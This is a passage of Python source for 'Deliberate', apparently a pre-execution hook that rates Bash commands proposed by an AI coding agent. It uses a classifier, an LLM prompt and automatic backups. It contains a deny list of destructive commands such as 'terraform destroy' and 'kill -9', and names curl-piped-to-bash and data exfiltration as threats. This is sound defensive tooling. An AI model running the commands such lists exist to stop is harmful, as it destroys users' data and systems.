    "aws s3 rm", "aws ec2 terminate",
    "terraform destroy",
    "systemctl stop", "systemctl disable",
    "kill -9", "killall", "pkill",
]


def debug(msg):
    if DEBUG:
        print(f"[deliberate-cmd] {msg}", file=sys.stderr)


def is_safe_command(command: str) -> bool:
    """Check if command is in the safe list (fallback)."""
    cmd_lower = command.strip().lower()
    return any(cmd_lower.startswith(prefix.lower()) for prefix in SAFE_PREFIXES)


def is_dangerous_command(command: str) -> bool:
    """Check if command matches dangerous patterns (fallback)."""
    cmd_lower = command.lower()
    return any(pattern.lower() in cmd_lower for pattern in DANGEROUS_PATTERNS)


def call_classifier(command: str) -> dict | None:
    """Call the classifier server for pattern + ML based classification."""
    if not USE_CLASSIFIER:
        return None

    request_body = json.dumps({"command": command}).encode('utf-8')

    try:
        req = urllib.request.Request(
            CLASSIFIER_URL,
            data=request_body,
            headers={"Content-Type": "application/json"},
            method="POST"
        )

        with urllib.request.urlopen(req, timeout=CLASSIFIER_TIMEOUT) as response:  # nosec B310
            result = json.loads(response.read().decode('utf-8'))
            debug(f"Classifier result: {result}")
            return result

    except urllib.error.URLError as e:
        debug(f"Classifier unavailable: {e}")
        return None
    except Exception as e:
        debug(f"Classifier error: {e}")
        return None


def extract_script_content(command: str) -> str | None:
    """Extract content of script files being executed.

    Detects patterns like:
    - bash /path/to/script.sh
    - sh script.sh
    - ./script.sh
    - source script.sh
    - python script.py
    """
    # Common script execution patterns
    patterns = [
        # bash/sh/zsh execution
        r'^(?:sudo\s+)?(?:bash|sh|zsh|ksh)\s+(?:-[a-zA-Z]*\s+)*([^\s|;&]+)',
        # Direct script execution (./script or /path/script)
        r'^(?:sudo\s+)?(\./[^\s|;&]+|/[^\s|;&]+\.(?:sh|bash|py|pl|rb|js))',
        # source or dot command
        r'^(?:source|\.)\s+([^\s|;&]+)',
        # Python execution
        r'^(?:sudo\s+)?python[23]?\s+(?:-[a-zA-Z]*\s+)*([^\s|;&]+\.py)',
        # Node execution
        r'^(?:sudo\s+)?node\s+(?:-[a-zA-Z]*\s+)*([^\s|;&]+\.js)',
    ]

    for pattern in patterns:
        match = re.search(pattern, command.strip())
        if match:
            script_path = match.group(1)
            script_path = os.path.expanduser(script_path)

            if os.path.isfile(script_path):
                try:
                    with open(script_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read(10000)  # Limit to 10KB
                        debug(f"Read script content from: {script_path} ({len(content)} chars)")
                        return content
                except (IOError, PermissionError) as e:
                    debug(f"Could not read script: {e}")
                    return None
            else:
                debug(f"Script file not found: {script_path}")
                return None

    return None


def extract_inline_content(command: str) -> str | None:
    """Extract inline content from heredocs and redirects.

    Detects patterns like:
    - cat > file << EOF ... EOF
    - cat > file << 'EOF' ... EOF
    - echo "content" > file
    - printf 'content' > file

    Returns the inline content if found, None otherwise.
    """
    # Heredoc patterns - capture content between << MARKER and MARKER
    # Handles both << EOF and << 'EOF' (quoted prevents variable expansion)
    heredoc_pattern = r'<<\s*[\'"]?(\w+)[\'"]?\s*\n(.*?)\n\1'
    heredoc_match = re.search(heredoc_pattern, command, re.DOTALL)
    if heredoc_match:
        content = heredoc_match.group(2)
        debug(f"Extracted heredoc content ({len(content)} chars)")
        return content

    # Echo redirect patterns - echo "..." > file or echo '...' > file
    # Capture the content being echoed
    echo_patterns = [
        # echo "content" > file
        r'echo\s+"([^"]+)"\s*>+\s*\S+',
        # echo 'content' > file
        r"echo\s+'([^']+)'\s*>+\s*\S+",
        # echo $'content' > file (bash ANSI-C quoting)
        r"echo\s+\$'([^']+)'\s*>+\s*\S+",
        # echo content > file (unquoted, single word)
        r'echo\s+([^\s>|;&]+)\s*>+\s*\S+',
    ]

    for pattern in echo_patterns:
        match = re.search(pattern, command)
        if match:
            content = match.group(1)
            # Unescape common sequences
            content = content.replace('\\n', '\n').replace('\\t', '\t')
            debug(f"Extracted echo content ({len(content)} chars)")
            return content

    # Printf redirect patterns - printf 'format' > file
    printf_patterns = [
        # printf "content" > file
        r'printf\s+"([^"]+)"\s*>+\s*\S+',
        # printf 'content' > file
        r"printf\s+'([^']+)'\s*>+\s*\S+",
    ]

    for pattern in printf_patterns:
        match = re.search(pattern, command)
        if match:
            content = match.group(1)
            # Unescape common sequences
            content = content.replace('\\n', '\n').replace('\\t', '\t')
            debug(f"Extracted printf content ({len(content)} chars)")
            return content

    return None


def call_llm_for_explanation(command: str, pre_classification: dict | None = None, script_content: str | None = None) -> dict | None:
    """Call the configured LLM to explain the command using Claude Agent SDK."""
    debug("call_llm_for_explanation started")

    llm_config = load_llm_config()
    if not llm_config:
        debug("No LLM configured")
        return None

    provider = llm_config["provider"]
    debug(f"LLM provider: {provider}")

    # Only use SDK for claude-subscription provider
    if provider != "claude-subscription":
        debug("Non-OAuth provider - falling back to direct API")
        return None

    # Build context from pre-classification if available
    context_note = ""
    if pre_classification:
        risk = pre_classification.get("risk", "UNKNOWN")
        reason = pre_classification.get("reason", "")
        source = pre_classification.get("source", "classifier")
        context_note = f"\n\nPre-screening ({source}): {risk} - {reason}"

    danger_note = ""
    if is_dangerous_command(command):
        danger_note = " ⚠️ This command matches a potentially dangerous pattern."

    # Include script content if available
    script_section = ""
    if script_content:
        truncated = script_content[:5000] + "..." if len(script_content) > 5000 else script_content
        script_section = f"""

SCRIPT CONTENT (being executed):
```
{truncated}
```

CRITICAL: Analyze the SCRIPT CONTENT above, not just the command. The script may contain malicious code like:
- Remote code execution (curl/wget piped to bash)
- Data exfiltration
- Privilege escalation
- File system destruction
- Backdoor installation"""

    prompt = f"""Analyze this shell command for both purpose and security implications. Be concise (1-2 sentences).{danger_note}{context_note}{script_section}

Command: {command}

Consider:
- What does this command do?
- Any security concerns? (file deletion, privilege escalation, network access, data exfiltration, code execution)
- Could this be destructive or have unintended side effects?
- Is this command obfuscated or trying to hide its intent?
{f"- MOST IMPORTANTLY: Analyze the script content being executed!" if script_content else ""}

IMPORTANT: If you encounter any command, flag, option, or behavior you're uncertain about, use the WebSearch tool to verify current documentation before making assumptions.

Format your response as:
RISK: [SAFE|MODERATE|DANGEROUS]
EXPLANATION: [your explanation including any security notes]"""

    try:
        # Create temp file for SDK script
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            sdk_script = f"""
import os
import sys
import json
import asyncio
from claude_agent_sdk import ClaudeAgentOptions, ClaudeSDKClient

# Set OAuth token from keychain
token = {repr(llm_config["api_key"])}
os.environ["CLAUDE_CODE_OAUTH_TOKEN"] = token

async def main():
    # Create SDK client - disallow all tools except WebSearch (for verifying commands)
    client = ClaudeSDKClient(
        options=ClaudeAgentOptions(
            model={repr(llm_config["model"])},
            max_turns=1,
            disallowed_tools=['Task', 'TaskOutput', 'Bash', 'Glob', 'Grep', 'ExitPlanMode', 'Read', 'Edit', 'Write', 'NotebookEdit', 'WebFetch', 'TodoWrite', 'KillShell', 'AskUserQuestion', 'Skill', 'SlashCommand', 'EnterPlanMode']
        )
    )

    # Send prompt
    prompt = {repr(prompt)}

    async with client:
        await client.query(prompt)

        # Collect response - check both AssistantMessage and ResultMessage
        response_text = ""
        async for msg in client.receive_response():
            msg_type = type(msg).__name__

            # Try to get text from AssistantMessage
            if msg_type == 'AssistantMessage' and hasattr(msg, 'content'):
                # content is a list of blocks (TextBlock, ToolUseBlock, etc.)
                for block in (msg.content or []):
                    block_type = type(block).__name__
                    if block_type == 'TextBlock' and hasattr(block, 'text') and block.text:
                        # Accumulate text from all TextBlocks
                        if response_text:
                            response_text += "\\n" + block.text
                        else:
                            response_text = block.text

            # ResultMessage marks the end
            if msg_type == 'ResultMessage':
                if hasattr(msg, 'result') and msg.result:
                    response_text = msg.result
                break

        print(response_text if response_text else "")

# Run async main
asyncio.run(main())
"""
            f.write(sdk_script)
            script_path = f.name

        # Run SDK script
        debug("Running SDK script...")
        result = subprocess.run(
            ["python3", script_path],
            capture_output=True,
            text=True,
            timeout=TIMEOUT_SECONDS
        )

        os.unlink(script_path)

        debug(f"SDK returncode: {result.returncode}")
        debug(f"SDK stderr: {result.stderr[:500] if result.stderr else 'none'}")
        if result.returncode != 0:
            debug(f"SDK script failed: {result.stderr}")
            return None

        content = result.stdout.strip()
        debug(f"SDK stdout (first 200 chars): {content[:200]}")

        # Parse the response
        risk = "MODERATE"
        explanation = content

        if "RISK:" in content and "EXPLANATION:" in content:
            parts = content.split("EXPLANATION:")
            risk_line = parts[0]
            explanation = parts[1].strip() if len(parts) > 1 else content

            if "DANGEROUS" in risk_line:
                risk = "DANGEROUS"
            elif "SAFE" in risk_line:
                risk = "SAFE"

        return {"risk": risk, "explanation": explanation}

    except Exception as e:
        debug(f"SDK error: {e}")
        return None


def main():
    debug("Hook started")

    # Periodically clean up old state files
    cleanup_old_state_files()

    try:
        input_data = json.load(sys.stdin)
        debug(f"Got input: tool={input_data.get('tool_name')}")
    except json.JSONDecodeError as e:
        debug(f"JSON decode error: {e}")
        sys.exit(0)

    # Extract session ID for deduplication
    session_id = input_data.get("session_id", "default")
    tool_name = input_data.get("tool_name", "")
    tool_input = input_data.get("tool_input", {})

    # Only process Bash commands
    if tool_name != "Bash":
        debug("Not a Bash command, skipping")
        sys.exit(0)

    command = tool_input.get("command", "")
    if not command:
        debug("No command, skipping")
        sys.exit(0)

    # Check if command should be skipped (trivial, always-safe commands)
    skip_commands = load_skip_commands()
    if should_skip_command(command, skip_commands):
        debug(f"Skipping trivial command: {command[:50]}")
        sys.exit(0)

    # Check command history for workflow patterns BEFORE individual analysis
    # Uses sliding window (default 3 commands) to avoid stale pattern matches
    history = load_command_history(session_id)
    workflow_patterns = detect_workflow_patterns(history, command)

    # Check for destruction consequences
    cwd = input_data.get("cwd", os.getcwd())
    destruction_consequences = get_destruction_consequences(command, cwd)

    # If we detect a dangerous workflow pattern, escalate immediately
    workflow_warning = ""
    workflow_risk_escalation = None  # Track if we need to escalate risk due to workflow
    if workflow_patterns:
        for pattern_name, pattern_risk, pattern_desc in workflow_patterns:
            workflow_warning += f"\n\n⚠️  WORKFLOW PATTERN DETECTED: {pattern_name} [{pattern_risk}]\n"
            workflow_warning += f"    {pattern_desc}\n"
            workflow_warning += f"    Session commands: {len(history['commands'])} | Cumulative risk: {history['cumulative_risk']}"

            # Track highest workflow risk for potential escalation
            if workflow_risk_escalation is None or pattern_risk == "CRITICAL":
                workflow_risk_escalation = pattern_risk

            # Show files at risk if we have them
            if history.get("files_at_risk"):
                files_preview = history["files_at_risk"][:5]
                workflow_warning += f"\n    Files at risk: {', '.join(files_preview)}"
                if len(history["files_at_risk"]) > 5:
                    workflow_warning += f" (+{len(history['files_at_risk']) - 5} more)"

    # Build destruction warning from consequences (already computed above)
    destruction_warning = ""
    if destruction_consequences and destruction_consequences.get("warning"):
        destruction_warning = f"\n\n{destruction_consequences['warning']}"

    # Layer 1: Try classifier server first (pattern + ML) for risk level
    classifier_result = call_classifier(command)

    # Fallback: Use inline pattern matching if classifier unavailable
    if not classifier_result:
        if is_safe_command(command):
            classifier_result = {"risk": "SAFE", "reason": "Known safe command pattern", "source": "pattern"}
        elif is_dangerous_command(command):
            classifier_result = {"risk": "DANGEROUS", "reason": "Known dangerous command pattern", "source": "pattern"}
        else:
            classifier_result = None  # No pattern match, rely on LLM

    # Extract script content if this is a script execution command
    script_content = extract_script_content(command)
    if script_content:
        debug(f"Detected script execution, read {len(script_content)} chars of script content")

    # Extract inline content if this is a heredoc/echo/printf write command
    inline_content = extract_inline_content(command)
    if inline_content:
        debug(f"Detected inline content write, extracted {len(inline_content)} chars")

    # Use whichever content we found (mutually exclusive in practice)
    # Script content = executing a file, inline content = writing via heredoc/echo
    analyzed_content = script_content or inline_content
    is_inline_write = inline_content is not None

    # Layer 2: Get LLM explanation for detailed analysis
    debug(f"Analyzing command: {command[:80]}")
    llm_result = call_llm_for_explanation(command, classifier_result, analyzed_content)

    # Progressive degradation: Use classifier if LLM unavailable
    llm_unavailable_warning = ""
    if not llm_result:
        if classifier_result and classifier_result.get("source") != "fallback":
            # Classifier worked, use its result even without LLM explanation
            risk = classifier_result.get("risk", "MODERATE")
            explanation = classifier_result.get('reason', 'Review command manually')
            llm_unavailable_warning = "\n\n⚠️  LLM unavailable - using basic pattern matching only.\nTo get detailed explanations, configure: ~/.deliberate/config.json\nOr run: deliberate install"
            debug("LLM unavailable, using classifier-only result")
        else:
            # Both layers failed - exit silently (fail-open)
            # This prevents blocking user if Deliberate is misconfigured
            debug("Both classifier and LLM unavailable, allowing command")
            sys.exit(0)
    else:
        # Use classifier risk if available, otherwise use LLM risk
        if classifier_result:
            risk = classifier_result.get("risk", llm_result["risk"])
        else:
            risk = llm_result["risk"]
        explanation = llm_result["explanation"]

    # Guard against None/empty explanation - fall back to classifier reason or generic message
    if not explanation or explanation == "None":
        if classifier_result and classifier_result.get("reason"):
            explanation = classifier_result.get("reason")
        else:
            explanation = "Review command before proceeding"

    # NOTE: Deduplication is handled AFTER block/allow decision
    # We moved it below to prevent blocked commands from being allowed on retry

    # Cache result for PostToolUse to display (persistent after execution)
    # This ensures analysis is visible even after PreToolUse prompt disappears
    # MD5 used for cache key only, not security
    cmd_hash = hashlib.md5(command.encode(), usedforsecurity=False).hexdigest()[:16]
    save_to_cache(session_id, cmd_hash, {
        "risk": risk,
        "explanation": explanation,
        "command": command[:200],  # Truncate for cache
        "llm_unavailable_warning": llm_unavailable_warning
    })

    # Add command to session history for workflow tracking
    add_command_to_history(session_id, command, risk or "MODERATE", explanation or "")

    # SAFE commands: auto-allow, PostToolUse will show info after execution
    # UNLESS a workflow pattern was detected - then we still need to warn
    if risk == "SAFE" and not workflow_patterns:
        debug(f"Auto-allowing SAFE command, cached for PostToolUse")
        sys.exit(0)

    # Trigger automatic backup for ANY destructive command (catch-all safety net)
    backup_config = load_backup_config()
    backup_path = None
    if backup_config.get("enabled", True):
        # Backup if we detected any destruction consequences - this is the catch-all
        # Regardless of risk level, if files will be deleted, back them up first
        should_backup = destruction_consequences is not None and (
            destruction_consequences.get("files") or
            destruction_consequences.get("dirs")
        )

        if should_backup:
            backup_path = create_pre_destruction_backup(
                session_id, command, cwd,
                destruction_consequences, history
            )
            if backup_path:
                debug(f"Created pre-destruction backup at: {backup_path}")

    # Auto-block DANGEROUS commands when both classifier AND LLM agree
    # This catches truly malicious commands like `rm -rf /` or malicious scripts
    # NOTE: Inline writes (heredocs/echo) only get "ask" - they're writes, not executions
    if risk == "DANGEROUS" and not is_inline_write:
        classifier_dangerous = classifier_result and classifier_result.get("risk") == "DANGEROUS"
        llm_dangerous = llm_result and llm_result.get("risk") == "DANGEROUS"

        # Block if both agree OR if script content was analyzed and found dangerous
        both_agree = classifier_dangerous and llm_dangerous
        script_analyzed = script_content is not None and llm_dangerous

        if both_agree or script_analyzed:
            # Auto-block with exit code 2 - cannot proceed
            block_message = f"⛔ BLOCKED by Deliberate: {explanation}"
            print(block_message, file=sys.stderr)
            debug(f"Auto-blocked DANGEROUS command (classifier={classifier_dangerous}, llm={llm_dangerous}, script={script_content is not None})")
            sys.exit(2)

    # ANSI color codes for terminal output
    BOLD = "\033[1m"
    CYAN = "\033[96m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    GREEN = "\033[92m"
    RESET = "\033[0m"

    # Choose emoji and color based on risk for visual branding
    if risk == "DANGEROUS":
        emoji = "🚨"
        color = RED
    elif risk == "SAFE":
        emoji = "✅"
        color = GREEN
    else:
        emoji = "⚡"
        color = YELLOW

    # User-facing message with branded formatting and colors
    # Color the explanation text so it's not easy to skip
    reason = f"{emoji} {BOLD}{CYAN}DELIBERATE{RESET} {BOLD}{color}[{risk}]{RESET}\n    {color}{explanation}{RESET}{llm_unavailable_warning}"

    # Add workflow warning if patterns were detected
    if workflow_warning:
        reason += f"\n{RED}{workflow_warning}{RESET}"

    # Add destruction consequences if we have them
    if destruction_warning:
        reason += f"\n{RED}{destruction_warning}{RESET}"

    # Add backup notification if we created one
    backup_notice = ""
    if backup_path:
        backup_notice = f"\n\n💾 Auto-backup created: {backup_path}"
        reason += f"\n{GREEN}{backup_notice}{RESET}"

    # For Claude's context (shown in conversation)
    context = f"**Deliberate** [{risk}]: {explanation}{llm_unavailable_warning}"
    if workflow_warning:
        # Strip ANSI codes for Claude's context
        context += workflow_warning
    if destruction_warning:
        context += destruction_warning
    if backup_notice:
        context += backup_notice

    # Session deduplication - only for "ask" commands (not blocked ones)
    # This prevents showing the same warning twice in a session
    if load_dedup_config():
        warning_key = get_warning_key(command)
        shown_warnings = load_state(session_id)

        if warning_key in shown_warnings:
            # Already shown this warning in this session - allow without re-prompting
            debug(f"Deduplicated: {warning_key} already shown this session")
            sys.exit(0)

        # Mark as shown and save state
        shown_warnings.add(warning_key)
        save_state(session_id, shown_warnings)

    output = {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "ask",
            "permissionDecisionReason": reason,
            "additionalContext": context
        }
    }

    print(json.dumps(output))

    sys.exit(0)


if __name__ == "__main__":
    main()
